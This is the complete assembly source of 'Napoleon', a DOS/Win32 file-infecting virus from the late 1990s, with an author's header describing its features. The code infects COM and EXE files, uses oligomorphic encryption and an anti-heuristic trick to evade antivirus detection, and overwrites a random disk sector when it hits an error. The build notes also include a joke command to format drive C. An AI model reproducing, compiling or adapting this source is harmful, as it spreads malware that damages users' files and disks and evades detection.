   ;  comment ¯
   ;                        ú N ú A ú P ú O ú L ú E ú O ú N ú
   ;
   ;                        Virus Written by Deadman of [SOS]
   ;                        ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;  Virus feautures:
   ;
   ;     This virus looks like a simple DOS overwriter, but it is able to work
   ;  perfectly in Win32. As you know, you can execute a WinPortableExecutable
   ;  from a DOS box, and it won't display that you are a fucking ass and so on.
   ;  Windows will hook an executing call and process file as normal Win32 program.
   ;  My virus uses this feauture.
   ;  It overwrites the original begin of infected program (with COM/EXE extension)
   ;  with itself. Begin will be located at the end of file. On execute virus will
   ;  find some files and infect them. Then virus will cure the infected program
   ;  and execute it using the legal DOS function 4B, subfunction 00. So, when Win
   ;  program is executed, Windows will open usual DOS box. From DOS box will be
   ;  executed cured PE/NE program, and DOS box will be terminated.
   ;     Virus preserves file time/date/attributes and kills error by replacing
   ;  int 24h. Also virus gets an exit code of executed program and quits with it.
   ;  Virus has an anti-heuristic subroutine. It'll call 2F interrupt function
   ;  1200h, it is MS-DOS installation check, returns al=FF. But heuristics can't
   ;  emulate it and will be killed! Also virus is oligomorphic in files using its
   ;  internal oligomorphic engine. On executing stack pair is relocated to another
   ;  area to avoid erorrs. On .EXE infection virus will build new exe header,
   ;  which will load virus only.
   ;     On any error virus will kill random sector and display that there is
   ;  not enough memory to run this program. By the way, virus infects 20 first
   ;  uninfected files, which are placed in the root directory of the current
   ;  drive. It seems virus will not perfectly determinate any overlay structure,
   ;  so it will break ones :(. Will not infect .com filez which are less than
   ;  Virus_Size bytes and greater than 62000 bytes.
   ;
   ;  Compile it:
   ;    tasm napoleon.asm /m
   ;    tlink napoleon.obj /x/t
   ;    del napoleon.obj
   ;    echo y|format c:/u ;)
   ;
   ;  Contacts:
   ;    dman@lgg.ru
   ;    www.lgg.ru/~dman
   ;                                          Enjoy reading code, Deadman.
   ;  ¯
   ;
    %out                   Napoleon Copyright (C) 1998-99 by Deadman [SOS]

                           ; asm code header
                           jumps
                           model   tiny
                           codeseg
                           locals
                           org     100h

    virus:                 ; anti-heuristic routine + infection mark
                           xor     ax,ax
                           mov     ds,ax
                           mov     si,2fh*4
                           mov     ax,1200h
                           pushf
                           call    dword ptr [si]
                           push    cs
                           pop     ds
                           inc     ax
                           db      04h
    key                    db      ?

                           ; decrypting virus
                           mov     cx,enc_size
                           lea     si,encrypted
    algo:                  nop
                           nop
                           inc     si
                           loop    algo

    encrypted:             ; set new int 24h handler
                           mov     ax,2524h
                           lea     dx,int24
                           int     21h

                           ; infect some filez
                           call    infect_filez

                           ; get the name of infected program
                           mov     si,2ch
                           mov     ds,[si]
                           mov     si,-1
                           xor     ax,ax
    findzero:              inc     si
                           cmp     word ptr [si],ax
                           jne     findzero
                           lea     dx,[si+4]

                           ; get file attributes
                           mov     ax,4300h
                           int     21h
                           jc      payload
                           push    cx dx ds

                           ; set attributes to normal
                           mov     ax,4301h
                           xor     cx,cx
                           int     21h
                           jc      payload

                           ; open program for read/write
                           mov     ax,3d02h
                           int     21h
                           jc      payload
                           xchg    ax,bx

                           ; set ds = cs
                           push    cs
                           pop     ds

                           ; move lseek pointer to the (eof-vsize)
                           mov     ax,4202h
                           mov     cx,-1
                           mov     dx,-vsize
                           int     21h

                           ; read vsize bytes
                           mov     ah,3fh
                           mov     cx,vsize
                           lea     dx,buffer
                           int     21h

                           ; move lseek pointer to the bof
                           mov     ax,4200h
                           xor     cx,cx
                           cwd
                           int     21h

                           ; remember file time and date
                           mov     ax,5700h
                           int     21h
                           push    cx dx

                           ; write the original begin of infected program
                           mov     ah,40h
                           mov     cx,vsize
                           lea     dx,buffer
                           int     21h
                           xor     cx,ax
                           jnz     payload

                           ; move lseek pointer to the (eof-vsize)
                           mov     ax,4202h
                           mov     cx,-1
                           mov     dx,-vsize
                           int     21h

                           ; truncate file
                           mov     ah,40h
                           xor     cx,cx
                           int     21h

                           ; restore file time and date
                           mov     ax,5701h
                           pop     dx cx
                           int     21h

                           ; close file
                           mov     ah,3eh
                           int     21h
                           jc      payload

                           ; restore file attributes
                           pop     ds dx cx
                           mov     ax,4301h
                           int     21h

                           ; resize virus's memory block
                           mov     ah,4ah
                           mov     bx,(memory_size+100h)/16+2
                           int     21h
                           jc      payload

                           ; prepare execute parameter block
                           mov     cs:seg1,cs
                           mov     cs:seg2,cs
                           mov     cs:seg3,cs

                           ; set new stack pair
                           mov     ax,cs
                           cli
                           mov     ss,ax
                           mov     sp,offset stacks+100h
                           sti

                           ; execute program
                           mov     ax,4b00h
                           lea     bx,epb
                           int     21h
                           jc      payload

                           ; restore stack
                           mov     ax,cs
                           cli
                           mov     ss,ax
                           mov     sp,offset stacks+100h
                           sti

                           ; quit with exit code of infected program
                           mov     ah,4dh
                           int     21h
                           mov     ah,4ch
                           int     21h

    payload:               ; error... I hate errors... Kill random sector
                           in      ax,40h
                           cmp     ax,200
                           jb      payload
                           cmp     ax,40000
                           ja      payload

                           xchg    dx,ax
                           mov     al,2
                           mov     cx,1
                           int     26h
                           pop     ax

                           push    cs
                           pop     ds
                           lea     dx,hehehe
                           mov     ah,9
                           int     21h
                           mov     ax,4c04h
                           int     21h

    int24:                 mov     al,3
                           iret

    hehehe                 db      'Program too big to fit in memory',0dh,0ah,24h

                           ; Execute Parameter Block
    epb                    dw      00h             ; default environment
                           dw      80h             ; command line
    seg1                   dw      ?
                           dw      5ch             ; FCB1
    seg2                   dw      ?
                           dw      6ch             ; FCB2
    seg3                   dw      ?

    copyright              db      '[Napoleon]',0
                           db      'Copyright (C) 1998-99 by Deadman [SOS]',0

    starstar:              mov     word ptr [di],'*\'
                           mov     word ptr [di+2],'*.'
                           mov     byte ptr [di+4],0
                           ret

    copyasciz:             lodsb
                           stosb
                           or      al,al
                           jnz     copyasciz
                           ret

    infect_filez:          ; initialize variables
                           mov     file_cnt,20
                           mov     dta_ptr,offset dtaz
                           lea     di,result
                           call    starstar
                           mov     dest_ptr,offset result+1

    ffirst:                ; find first in current path
                           mov     ah,4eh
                           mov     cx,11110111b
                           lea     dx,result
                           jmp     do_find

    smth_else:             ; find next file using current dta
                           mov     ah,4fh
    do_find:               push    ax dx
                           mov     ah,1ah
                           mov     dx,dta_ptr
                           int     21h
                           pop     dx ax
                           int     21h

                           ; no more -> take previous dir
                           jc      dotdot

                           ; file count limited?
                           cmp     file_cnt,0
                           jz      return

                           ; checking found unit: dir or file
                           mov     si,dta_ptr
                           test    byte ptr [si+15h],10000b
                           jz      infect
                           cmp     byte ptr [si+1eh],'.'
                           jz      smth_else
                           mov     di,dest_ptr
                           mov     word ptr [si+43],di
                           add     si,1eh
                           call    copyasciz
                           mov     dest_ptr,di
                           dec     di
                           call    starstar
                           add     dta_ptr,45
                           jmp     ffirst

    dotdot:                ; taking previous dir
                           sub     dta_ptr,45
                           mov     di,dta_ptr
                           cmp     di,offset dtaz
                           jb      return
                           mov     ax,[di+43]
                           mov     dest_ptr,ax
                           jmp     smth_else

    infect:                ; copy name+ext of file found
                           mov     di,dest_ptr
                           mov     si,dta_ptr
                           add     si,1eh
                           call    copyasciz

                           ; check extension of file found
                           cmp     word ptr [si-4],'OC'
                           je      check_com
                           cmp     word ptr [si-4],'XE'
                           je      check_exe
                           jmp     smth_else
    check_com:             cmp     byte ptr [si-2],'M'
                           je      infect_executable
                           jmp     smth_else
    check_exe:             cmp     byte ptr [si-2],'E'
                           jne     smth_else

    infect_executable:     ; clearing attributes
                           mov     ax,4301h
                           xor     cx,cx
                           lea     dx,result
                           int     21h
                           jc      try_next

                           ; opening file
                           mov     ax,3d02h
                           int     21h
                           xchg    ax,bx

                           ; reading first vsize bytes
                           mov     ah,3fh
                           mov     cx,vsize
                           lea     dx,buffer
                           int     21h
                           xor     cx,ax
                           jnz     close

                           ; exe determination
                           cmp     word ptr buffer,'MZ'
                           je      exetype
                           cmp     word ptr buffer,'ZM'
                           je      exetype

                           ; here is .com type: filesize check + infection check
                           mov     file_type,'C'
                           cmp     word ptr buffer,0c033h
                           jz      close
                           mov     si,dta_ptr
                           mov     ax,word ptr [si+1ah]
                           mov     dx,word ptr [si+1ch]
                           or      dx,dx
                           jnz     close
                           cmp     ax,62000
                           ja      close
                           jmp     no_check

    exetype:               ; here is .exe type: infection check
                           mov     file_type,'E'
                           cmp     word ptr buffer+20h,0c033h
                           jz      close

    no_check:              ; lseek to the eof
                           mov     ax,4202h
                           xor     cx,cx
                           cwd
                           int     21h

                           ; writing the original begin to eof
                           mov     ah,40h
                           mov     cx,vsize
                           lea     dx,buffer
                           int     21h
                           xor     cx,ax
                           jnz     close

                           ; lseek to the bof
                           mov     ax,4200h
                           xor     cx,cx
                           cwd
                           int     21h

                           ; prepare for write virus
                           mov     ah,40h
                           mov     cx,vsize
                           lea     dx,buffer

                           ; exe determination
                           cmp     file_type,'E'
                           jne     no_exe

                           ; .exe trick, write new exe header
                           push    ax bx cx dx
                           mov     ah,40h
                           mov     cx,20h
                           lea     dx,exe_hdr
                           int     21h
                           pop     dx cx bx ax
                           sub     cx,20h

    no_exe:                ; encrypt virus
                           call    encrypt

                           ; write virus body
                           int     21h
                           dec     file_cnt

    close:                 ; restore file time/date
                           mov     si,dta_ptr
                           mov     ax,5701h
                           mov     cx,word ptr [si+16h]
                           mov     dx,word ptr [si+18h]
                           int     21h

                           ; close file
                           mov     ah,3eh
                           int     21h

                           ; restore file attributes
                           mov     ax,4301h
                           xor     cx,cx
                           mov     cl,byte ptr [si+15h]
                           mov     dx,9eh
                           int     21h

    try_next:              ; look for a next file
                           jmp     smth_else

    return:                ret

    ;                      ***********************
    ;                      * OLIGOMORPHIC ENGINE *
    ;                      ***********************

    encrypt:               ; save registers are in use
                           push    ax bx cx dx si di bp

                           ; copy virus to the buffer
                           mov     si,100h
                           lea     di,buffer
                           mov     cx,vsize
                           rep     movsb

                           ; get random decryptor
                           in      al,40h
                           sub     al,2
                           jnc     $-2
                           add     al,2
                           cbw
                           add     al,al
                           push    ax
                           add     ax,offset algo_table
                           mov     si,ax
                           mov     ax,word ptr [si]
                           mov     word ptr buffer[algo-virus],ax

                           ; get encryptor for this decryptor
                           pop     si
                           add     si,offset de_table
                           mov     ax,word ptr [si]
                           mov     word ptr algo_temp,ax

                           ; get encrypting key
    get_normal:            in      al,40h
                           or      al,al
                           jz      get_normal
                           mov     byte ptr buffer[key-virus],al

                           ; set SI and CX
                           lea     si,buffer+(encrypted-virus)
                           mov     cx,enc_size

                           ; encrypting virus
    algo_temp:             dw      ?
                           inc     si
                           loop    algo_temp

                           ; restore registers
                           pop     bp di si dx cx bx ax

                           ; return
                           ret

    algo_table:            ; encryptors
                           sub     [si],al
                           xor     [si],al
                           add     [si],al

    de_table:              ; decryptors
                           add     [si],al
                           xor     [si],al
                           sub     [si],al

    exe_hdr:               ; virus .exe header
                           dw      5a4dh           ; signature
                           dw      0000h           ; image size mod 512
                           dw      0002h           ; image size div 512
                           dw      0000h           ; relocations
                           dw      0002h           ; header size in paragraphs
                           dw      0000h           ; minimum memory
                           dw        -1h           ; maximum memory
                           dw       -10h           ; SS
                           dw        -2h           ; SP
                           dw      019fh           ; checksum (fuck her)
                           dw      0100h           ; IP
                           dw       -10h           ; CS
                           dw      0000h           ; offset of relocation table
                           dw      0000h           ; overlay number

                           ; garbage for .exe infection
                           db      20h dup (5ah)

    vsize                  equ     $-virus
    enc_size               equ     $-encrypted

    buffer                 db      vsize dup (0C3h)
    file_type              db      ?
    file_cnt               db      ?
    dta_ptr                dw      ?
    dest_ptr               dw      ?
    stacks                 db      100h dup (?)
    result                 db      200h dup (?)
    dtaz                   label   byte
    memory_size            equ     $-virus
                           end     virus
